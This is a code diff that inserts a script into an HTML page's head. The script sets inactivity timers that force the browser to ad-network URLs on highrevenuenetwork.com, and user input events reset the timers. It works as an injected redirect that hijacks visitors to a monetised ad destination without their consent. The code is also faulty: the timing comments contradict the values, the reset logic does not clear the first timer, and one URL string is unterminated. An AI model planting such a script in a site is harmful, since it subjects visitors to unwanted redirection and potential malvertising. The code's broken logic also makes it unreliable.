@@ -29,6 +29,38 @@
         })()
       </script>
     <!-- place your code between these tags -->
+
+    <script>
+        // Function to redirect after 10 seconds of inactivity
+        function startInactivityTimer() {
+            setTimeout(function() {
+                window.location.href = "https://www.highrevenuenetwork.com/srdr6ie4?key=11eec3aebd7858ea63892001382bf348";
+            }, 5000); // 5 seconds = 5000 milliseconds
+        }
+
+        // Reset the timer on any user interaction
+        function resetTimer() {
+            clearTimeout(inactivityTimeout);
+            startInactivityTimer();
+        }
+
+        let inactivityTimeout;
+
+        // Start the inactivity timer when the page loads
+        window.onload = function() {
+            inactivityTimeout = setTimeout(function() {
+                window.location.href = "https://www.highrevenuenetwork.com/q25xerbpa?key=f0e29781777a9b12ba3ffe4698a29a0e;
+            }, 10000);
+
+            // Reset the timer on any of the following events
+            window.onmousemove = resetTimer;
+            window.onmousedown = resetTimer; // Touchscreen presses
+            window.ontouchstart = resetTimer;
+            window.onclick = resetTimer;     // Clicks
+            window.onkeydown = resetTimer;   // Key presses
+            window.addEventListener('scroll', resetTimer, true); // Scrolling
+        };
+    </script>
 </head>
 <body class="en style1" style="height: 919px;">
     
